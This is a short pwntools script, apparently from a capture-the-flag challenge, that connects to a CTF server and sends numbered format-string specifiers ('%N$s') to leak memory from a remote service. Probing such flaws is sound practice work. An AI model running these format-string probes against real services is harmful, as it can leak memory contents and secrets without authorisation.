from pwn import *
#elf = context.binary = ELF('./formatt', checksec=False)
#context.log_level = "DEBUG"

for i in range(50):
  try:
    p = remote('ctf.teractf.com', '2231')
    p.sendlineafter(b': ', '%{}$s'.format(i).encode())
    result = p.recvuntil(b': ')
    print(str(i) + ': ' + str(result))
    p.close()
  except EOFError:
    pass

